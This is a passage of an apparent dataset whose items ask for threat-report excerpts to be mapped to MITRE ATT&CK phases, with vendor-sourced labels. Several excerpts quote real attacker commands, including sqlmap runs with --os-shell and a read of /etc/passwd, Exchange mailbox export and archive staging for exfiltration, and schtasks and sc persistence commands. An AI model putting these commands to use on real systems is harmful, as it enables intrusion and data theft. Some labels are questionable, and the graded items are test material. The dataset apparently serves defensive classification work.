        "input": "Described attack activity: Tick has left a trail of evidence indicating that its activity began as early as 2006. In earlier attacks, the group used malicious Microsoft Word documents to infect victims, with compromised websites being added to the mix as a more recent attack vector.\nTick appears to be a well-organized group, with the funding and capability to develop and update its malware. It has the ability to compromise legitimate infrastructure to use for malware distribution and has access to stolen digital certificates to sign its malware when needed. Tick primarily uses purchased infrastructure for its C&C servers and has been able to stay off the radar since 2006.\nTick exhibits all the hallmarks of an advanced cyberespionage group. The long lifespan of the group, as well as the consistent targeted attacks against specific industries, support this theory. The individuals or organization behind Tick's operations has an interest in Japanese technology along with Japanese media and broadcasting organizations. While Tick's tactics may change over time, the group's history indicates that its focus will continue to be a narrow range of targets, mainly in Japan.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1012: Query Registry T1033: System Owner/User Discovery T1057: Process Discovery T1069: Permission Groups Discovery T1069.002: Domain Groups T1082: System Information Discovery T1083: File and Directory Discovery T1087: Account Discovery T1087.002: Domain Account T1482: Domain Trust Discovery T1518: Software Discovery ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft has observed Volt Typhoon discovering system information, including file system types; drive names, size, and free space; running processes; and open networks. They also attempt to discover other systems on the compromised network using PowerShell, Windows Management Instrumentation Command-line (WMIC), and the ping command. In a small number of cases, the threat actors run system checks to determine if they are operating within a virtualized environment. ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exploit public-facing application  T1190 \nA major question for an investigator is how the attackers penetrated the target system. At the penetration stage, APT41 threat actors used various techniques, including spear-phishing emails, exploiting a range of vulnerabilities (including Proxylogon), and watering hole and supply chain attacks. In the campaigns we analyzed, in some cases the threat actors penetrated target systems using SQL injections. Below we describe the commands used by APT41 in detail. Such attacks were carried out with the publicly available tool SQLmap, which the attackers used for multiple purposes. \nIn some organizations APT41 members gained access to the command shell of a target server and were able to execute certain commands. The group also used this tool to upload files to the target server. At this stage, the files were either Cobalt Strike Beacons or custom web shells. \nIn other cases, the threat actors gained access to databases with information about existing accounts, lists of employees, and plaintext and hashed passwords. \nNevertheless, the main tool that the attackers used in their campaigns was Cobalt Strike Beacon. \nSQLmap launched in various attacks: \npython sqlmap.py -r [Company1_domain].txt --tamper=space2comment --random-agent -p   \nctl00%24ContentPlaceHolder1%24txtUserName,ctl00%24ContentPlaceHolder1%24txtPassw   \n--os-shell python sqlmap.py -r [Company2_domain].txt -p   \n\"ctl00%24MainContent%24txtUserName,ctl00%24MainContent%24txtPassword\" --is-dba -   \nhex sqlmap.py -u [Company3_domain]/content.php?id=2141&sub=153 --random-agent --   \ntamper=space2comment --time-sec=10 --current-user python sqlmap.py -r   \n[Company4_domain] -p   \n\"ctl00%24ContentPlaceHolder1%24txtUserName,ctl00%24ContentPlaceHolder1%24txtPass   \n--file-write=\"/root/sqlmap/{Redacted_filename}.aspx\" --file-dest=\"   \n{Redacted_filepath}\\\\login1.aspx\" python sqlmap.py -u   \n\"http://[Company5_domain]/[redacted]/[redacted]/[redacted].php/?   \npage1=DM&page2=TOTAL_DATA_DOWNLOAD&page3=TOTAL_DATA_DOWNLOAD\" -p   \n\"page1\" --file-read \"/etc/passwd\" \nThe SQL injections enabled the threat actors to gain various levels of access to 43 out 86 websites they probed. The following diagrams were built based on sqlmap logs. According to this data, MySQL was installed on most of the compromised websites. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network.\nThis activity was also clearly visible in Zeek SMB File data in the network.\nA local service was also registered on each of the targeted systems, configured to execute the Qbot DLL usingregsvr32.exe\nThe following Suricata signatures identified both the remote file creation and service registration events:\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access \nET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement\nExecution of the new service was observed shorty after invoking the Qbot DLL.\nThe threat actor also used RDP to pivot between systems on the network such as a domain controller and a file server.\nThe creation of therdpclip.exeprocess on the target host is another indication that a RDP connection was successful. The start of this process by a non-human account is another great detection opportunity.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During operations, UNC4466 takes steps to evade detection. Apart from clearing event logs, UNC4466 also used the built in Set-MpPrefernce cmdlet to disable Microsoft Defender's real-time monitoring capability. ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker exfiltrated e-mail data from targeted accounts using the NewMailboxExportRequest command followed by Get-MailboxExport-Request command. In this case, the attacker was only interested in mail received this year. \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"New-MailboxExportRequest -Mailbox foobar@organization.here -ContentFilter {(Received -ge '03/01/2020')} -FilePath '\\\\<MAILSERVER>\\c\\$\\temp\\b.pst'\" \nThe attacker created password-protected archives on the victims' OWA server so that they could be exfiltrated via a simple HTTP request. \nC:\\Windows\\system32\\cmd.exe /C .\\7z.exe a -mx9 -r0 -p[33_char_password]  \"C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Redir.png\"C:\\Temp\\b.pst\nAn example URL for the attacker to collect the exfiltrated data would be: \nhttps://owa.organization.here/owa/auth/Redir.png \nOn disk, this was located at the following path: \n\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ \nVolexity also saw the attacker stage other exfiltration in another folder on the server located here: \n\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\\ \nFinally, the attacker added their own devices as allowed IDs for active sync for a number of mailboxes using Set-CASMailbox: \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"Set-CASMailbox -Identity <UserID $>$ -ActiveSyncAllowedDeviceIDs $@$ {add $=$ 'XXXXXXXXXXXXX'}\" ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By Asheer Malhotra, Kendall McKay \nTUESDAY, MARCH 29, 2022 08:01 \nTHREAT SPOTLIGHT RAT\nCisco Talos has observed a new Transparent Tribe campaign targeting Indian government and military entities. While the actors are infecting victims with CrimsonRAT, their well-known   \nmalware of choice, they are also using new stagers and implants.   \nThis campaign, which has been ongoing since at least June 2021, uses fake domains mimicking legitimate government and related organizations to deliver malicious payloads, a   \ncommon Transparent tribe tactic. Based on our analysis of Transparent Tribe operations over the last year, the group has continued to change its initial entry mechanisms and incorporate new bespoke malware,   \nindicating the actors are actively diversifying their portfolio to compromise even more   \nvictims.   \nNotably, the adversary has moved towards deploying small, bespoke stagers and downloaders that can be easily modified, likely to enable quick and agile operations. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder). The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.\nMalicious ISO file\nFirst, the user clicked on the ISO file, which created a new virtual hard drive disk. Such activity can be tracked with Event 12 from Microsoft-Windows-VHDMP/Operational.\nThis ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.\nAs we can see below using LECmd by Eric Zimmerman, the file documents.lnk points to max\\eyewear.bat.\nAs a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat\nThe batch file eyewear.bat then executed two commands:\nIt first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user's AppData\\Local\\Temp\\ folder :\nThen, DLL was executed using rundll32.exe :\nWant to block ISOs from automatically mounting when double clicked? Check outHuntress's recent writeup.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To ensure persistence in target systems, the attackers used Task Scheduler and created Windows services. \nScheduled Task/Job: At (Windows)  T1053.002 schtasks /create /s 192.168.111.3 /u {redacted} /p {redacted} /tn dda /sc onstart /tr C:\\PerfLogs\\vmserver64.exe /ru system /f SCHTASKS /Create /S 10.200.244.222 /U test\\administrator /P {redacted} /RU \"system\" /tn rlsv /sc DAILY /tr c:\\2012.bat /F SCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P {redacted} /RU SYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\" schtasks /create /tn rlsv1 /U test\\Administrator /P {redacted} /tr C:\\2012.bat /sc DAILY /s 10.200.244.222 /RU system SCHTASKS /Create /RU SYSTEM /SC ONSTART /TN Update /TR \"C:\\windows\\system32\\calc.exe\" SCHTASKS /Create /RU SYSTEM /SC ONSTART /TN dllhosts /TR \"dllhosts.exe\" schtasks.exe /s 192.168.0.28 /u \"administrator\" /p {redacted} /Create /tn VMUSS /tr \"c:\\users\\public\\install.bat\" /st 15:58 /sc once /ru system \nSystem Services: Service Execution  T1543.003 \nsc \\\\172.26.16.81 Create SuperIe binPath= \"cmd.exe /k   \nc:\\users\\public\\SecurityHealthSystray.exe\" sc Create syscmd binpath=\"cmd/k start\"type= own type= interact sc \\\\192.168.111.112 create res binpath=\"C:\\PerfLogs\\vmserver.exe\" sc start LxpSrvc \nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder  T1547.001 \nIn some cases the threat actors placed their malicious files in the startup folder on remote computers, which made the files execute every time the victim's operating system was launched. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Through their RDP session on the beachhead, the threat actor typed 'virus' in the start menu search to navigate to the 'Virus & threat protection' settings to ensure Windows Defender was completely turned off.\nAfter exfiltrating data off the file server via Rclone, the Windows event logs were cleared via PowerShell:\nThe wevtutil switches used:\nel | enum-logs List log names\ncl | clear-log Clear a log\nThe threat actor also deleted the files they brought into the environment:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Create or Modify System Process: Windows Service\nAnyDesk:To establish persistence on a compromised Windows host, the threat actor leverages the well-known Remote Monitoring and Management (RMM) tool AnyDesk. The PowerShell script \"any.ps1\" automates the download and installation of AnyDesk, including the setting of the passwordAdmin#123to access the RMM.\nA comprehensive description of AnyDesk and all the potential techniques to detect are detailed inlolrmm.io.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We did not observe the final actions of the threat actors during this intrusion.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor connected to various hosts in the network via RDP tunneled through the beacon process on the beachhead host.\nWe can find the hostname of the threat actor present in some of the Windows logs, event ID's 4624, 4776, 4778, and 4779.\nThe workstation name observed in a 4624 event on the beachhead:\nSeen again in a 4776 event from a domain controller:\nAnd again in 4778 followed by 4779 on the domain controller:\nDuring the RDP session, 1.dll (Cobalt Strike DLL) was transferred from the beachhead via the Windows File Explorer.\nSimilarly, the final files used to execute the ransomware deployment were transferred in the same manner, which can be seen via the file creation logging process being Explorer.EXE.\nOnce k.exe and p.bat, and various other batch scripts were transferred to the compromised domain controller, the threat actor then tried to copy k.exe to other machines on the network viacopycommand executed on the domain controller.\nThis command execution may not have worked properly, or as backup the threat actor ran the copy command again, but this time instead of executing cmd/K copyon the domain controller they ran wmic to execute the copy command from the remote host's instead.\nThis process was repeated for p.bat, this repetition makes it likely that this was scripted out rather than a failed execution of the copy process.\nFirst, copy command issued on domain controller:\nSecond, copy command with WMIC for remote hosts to run the command.\nOnce both k.exe and p.bat were copied to the machines in the network, the threat actor used PsExec.exe to remotely create a service namedmstdcto run p.bat (p.bat runs k.exe, which encrypts the system based on the Base64 encoded config) via System account.\nEach host on the receiving end of PsExec has a '.key' file created. The filename contains the hostname of the machine that initiated PsExec.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Similar to aprevious case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To escalate privileges, DarkGate will perform two different approaches depending on the used crypter: \n\u2022 If the binary does not use any kind of crypter, ID 11 (raw stub option), it will try to simply elevate privileges to SYSTEM using the Sysinternals tool PsExec as follows: \nC:\\> cmd /c c:\\temp\\PsExec.exe -accepteula -i -d -s [TARGET_BINARY] \u2022 In case any of the two available crypters are used, DarkGate will try to elevate privileges using the process hollowing technique. The binary will request the CnC the binary to be injected into notepad.exe, which we suspect it will perform the elevation and the relaunching of the application. However, we did not successfully retrieve such binary. ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Attackers typically use C2 domains for servers that send malware and communicate with devices compromised by malware. Our real-time malicious DNS traffic pattern detector can effectively capture DNS traffic of C2 domains based on their characteristic behavior patterns.\nOur detector identified one such C2 domain, biillpi[.]com. Figure 4 shows the DNS request trends for this domain. We observe that the domain receives requests that peak once per day with relatively stable gaps. This pattern correlates with the malicious network activity pattern of Trojans.\nMalware typically stays dormant for extended periods of time and activates periodically to contact the C2 server in a heartbeat pattern to confirm connection and obtain further instructions. Therefore, the network traffic a Trojan produces is sparse and presents stable patterns. Furthermore, we also observed that the DNS traffic for this domain consists of many different subdomains with random strings, which could carry data that an attacker attempted to exfiltrate through DNS tunneling.",
        "output": "command and control",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP was used to move laterally to multiple machines in the environment, which included domain controllers, backup machines, etc.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During this intrusion, the threat actor relied solely on the external RDP access that they used when they initially breach the network. Further, the threat actor initially connected via the IP 77.83.36[.]6 and from the remote host named WIN-L1MS2GT1R2G.\nAround two and a half hours into the intrusion the initial IP address disconnected and a second connection was made to the beachhead from 193.106.31[.]9 and host 6CU548W0BH. From this session, the ransomware files were staged and executed.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access for this actor was via exposed RDP services. Originally, the actor connected from 198.96.155.3, and then performed a kind of hand off over the course of the campaign, first to23.129.64.190and then finally185.220.100.240. All 3 of these IP's belong to the Tor network and function as exit nodes.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Raspberry Robin is typically introduced via infected removable drives, often USB devices. The Raspberry Robin worm often appears as a shortcut .lnk file masquerading as a legitimate folder on the infected USB device. \nSoon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry entry is updated and records execution of a ROT13-ciphered value referencing a .lnk file when deciphered. In the example below, q:\\erpbirel.yax deciphers to d:\\recovery.lnk. \nProcessspawned \n2022-02-20 14:43:14.525 GMT regmod First wrote to\\registry\\user\\s-1-5-21-432587278-3 21508835-1117227555-53619\\software\\micr0soft\\windo ws\\currentversion\\explorer\\userassist\\{f4c57c4b-20 46-46f0-a9eb-443bcko33d9f}\\count\\q:\\erpbirel.yax \nFigure 2: Registry modification with ROT13 . Lnk file ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: PHOTOLOADER is a downloader that has been observed to download ICEDID. It makes an HTTP request for a fake image file, which is RC4 decrypted to provide the final payload. Host information is sent to the command and control (C2) via HTTP cookies. Samples have been observed to contain an embedded C2 configuration that contain the real C2 with a number of non-malicious \nSo Unchill: Melting UNC2198 ICEDID to Ransomware Operations | Mandiant | Google Cloud Blog domains. The non-malicious domains are contacted in addition to the real C2. \nWINDARC is a backdoor that hijacks the execution of TeamViewer to perform C2 communication. It supports plugins and accepts several backdoor commands. The commands include interacting with the TeamViewer tool, starting a reverse shell, loading new plugins, downloading and executing files, and modifying configuration settings. \nSYSTEMBC is a proxy malware that beacons to its C2 and opens new proxy connections between the C2 and remote hosts as indicated by the C2. Proxied communications are encrypted with RC4. The malware receives commands via HTTP and creates new proxy connections as directed. Underground sales advertisements refer to the software as a \"socks5 backconnect system\". The malware is typically used to hide the malicious traffic associated with other malware. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed a process created by Cobalt Strike accessing lsass.exe. The GrantedAccess code of0x1010is a known indicator of such tools as Mimikatz. This was observed on both the beachhead host and a domain controller.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant is currently tracking four distinct uncategorized (UNC) groups involved in exploiting this vulnerability. We have observed some lower degrees of confidence overlaps in post-exploitation stages among these UNC groups, like using the same recon commands and utilities available on Windows. The common tools observed across multiple intrusions were: \ncsvde.exe certutil.exe local.exe nbtscan.exe \nTwo threat clusters used Mimikatz for dumping process memory. Notably, there were no overlaps in infrastructure between these clusters of activity. The exploits were sourced from different VPN provider IP addresses and previously compromised third-party devices. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID registered a scheduled task to gain persistence on the beachhead host, which ran every hour.\nWe can also see similar information in memory by reviewing most recently created scheduled tasks:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In both attacks, before the actual execution of the ransomware, the attackers performed several actions preparing systems to make the execution as successful as possible. On the day of the attack, the attacker logged in to the domain controller and opened the group policy management interface. The attackers then dropped and executed a file named \"apply.ps1.\" We believe this script created and prepared the group policy to cause the execution of the ransomware throughout the domain. \nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\apply.ps1 \nThis execution results in the immediate writing of group policy files to disk and is followed by the execution of the following command to force the deployment of the group policy: \ncmd.exe /q /c gpupdate /force \nA few minutes before BlackCat ransomware started encrypting files, the attackers executed a script called \"defender.vbs\": ",
        "output": "impact",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader. We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in thewuauclt.exeprocess executed several PowerShell functions for UAC bypasses including:\nUAC-TokenMagic\nInvoke-SluiBypass",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic. IP's used to maintain access over RDP\nEmpire\nKoadic45.147.231.210:9999 C2 Check-inCommand execution",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos is continuously analyzing email based malware always looking at how adversaries change and the new techniques that are being added on an almost constant basis. Recently we noticed some novel ways that adversaries are leveraging Google and Tor2Web proxies to spread a ransomware variant, Cerber 5.0.1. \nThis particular campaign looks to have started on November 24th and has been ongoing for the past several days. This campaign did not use advanced techniques that we sometimes see used by adversaries that include well written, professional looking emails, with legitimate signature blocks or other identifying characteristics. In this campaign, the emails were anything but professional. However, they did vary significantly with what we typically see from a ransomware distribution perspective. \nToday, spam based ransomware infections are heavily skewed toward Locky. The majority of spam messages we see today are affiliates producing large amounts of spam that leverage various types of script-based file extensions to download the Locky executable and infect systems. This campaign looked different in that the messages didn't contain an attachment and were extremely short and basic. What we found was a potential next evolution for ransomware distribution that relies more heavily on Tor to obfuscate their activity and hinder the ability to shut down servers that are hosting the malicious content. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This research highlights how a single malicious model deployment could compromise an entire AI environment. An attacker could use even one unverified model deployed on a production system to exfiltrate sensitive data, leading to severe model exfiltration attacks.\nThe permissions required to deploy a model might seem harmless, but in reality, that single permission could grant access to all other models in a vulnerable project. Only a very few individuals should have the permission to deploy new models in a project containing sensitive or production models without strict oversight.\nTo protect against such risks, we must implement strict controls on model deployments. A fundamental security practice is to ensure an organization's development or test environments are separate from its live production environment. This separation reduces the risk of an attacker accessing potentially insecure models before they are fully vetted. Whether it comes from an internal team or a third-party repository, validating every model before deployment is vital.\nThis highlights the critical need forPrisma Cloud AI Security Posture Management(AI-SPM) to help ensure robust oversight of AI pipelines.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Web Shell Create Account New Service Scheduled Task \nPrivilege escalation \nValid Accounts Web Shell \nDefense evasion \nIndicator Removal from Tools Obfuscated Files or Information Masquerading \nCredential access \nCredential Dumping ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller. They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator's real hostname was captured in event ID 4624:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cobalt Strike (S0154)\nThe bash history included a nohup command to run a Cobalt Strike server with the following password and account details:\nThe IP 116.212.120.32 exposed the following beacon configuration, most notably a cracked watermark of 987654321:\nThe threat actor left behind the file \u7ea2\u961f\u7248.zip in the root of the open directory.\nThe zip contained a Cobalt Strike kit which was also the same that was extracted to the root of the open directory.\nThe aggressor script CrossC2-GithubBot-2023-03-27.cna was sourced from thisrepo.\nThe other major modules as part of this Cobalt Strike kit are TaoWu and Landon which extends Cobalt Strike's capabilities.\nTaoWu\nTheTaoWu aggressorscript includes tooling and scripts that adds to Cobalt Strike actions.\nIt includes a huge number of precompiled binaries in the path taowu-cobalt-strike-master\\script :\nLadon\nTheLadon pluginfor Cobalt Strike is a framework that allows for lots of automation of intrusion activity.\nThe documentation (https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA) includes screenshots such as:\nViper\nViperis a command and control tool used for post exploitation activity. It is one of the C2 frameworks tracked by the DFIR ReportThreat Intelligence group. According to the GitHub profile:\nIt was installed through the execution of thef8xscript, which installs docker dependencies and a mostly pre-configured docker image:\nThe threat actor was asked to provide a password upon initial install, and reused the password that was configured for the Cobalt Strike team server:\nThe Viper C2 management panel was observed listening on the default tcp port 60000, and using the default SSL certificates provided with the docker image. A pivot on the default SSL certificate in Censys shows a much broader network of this VIPER docker image publicly exposed on the Internet.\nCensys Search:\nThe threat actor was observed using the Viper C2 for post exploitation on a AWS host running a Bitnami WordPress app. After initial access was gained, the vipermsf (Metasploit) backend was utilized to run a one-line command to upload and execute a file:\nThe ONE-LINE-CMD pattern matches the format utilized in the Viper MSF Web Delivery API found inGithub:\nInformation gathered from the Redis RDB dump file using (https://github.com/sripathikrishnan/redis-rdb-tools) shows that the execution was successful, and the threat actor was able to achieve execution of the payload (recovered from the host info module):\nDue to the location of the payload being written to disk matching POC exploit code (https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-25003.yaml) , we assess with high confidence that initial access was gained through a WordPress plugin WPCargo exploit, specifically, the Remote Code execution vulnerability CVE-2021-25003.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: FIN6 used encoded PowerShell commands to install Cobalt Strike on compromised systems. The attacker made use of Cobalt Strike's \"psexec\" lateral movement command to create a Windows service \nnamed with a random 16-character string on the target system and execute encoded PowerShell. In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com. ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: At roughly the 2 hour mark, we saw the threat actors begin to act on their final objectives. RDP connections were initiated from one of the domain controllers and the Ryuk executables were deployed and executed over these RDP connections. Servers such as the backup systems, file servers, and automation tools were targeted first, followed by workstations.\nCommands ran prior to ransom execution:\nWhile encryption was started 2 hours into the attack, by the 3 hour mark the actors had completed ransom of the entire environment.\nEnjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support!\nWe also have pcaps, files, memory images, and Kape packages availablehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
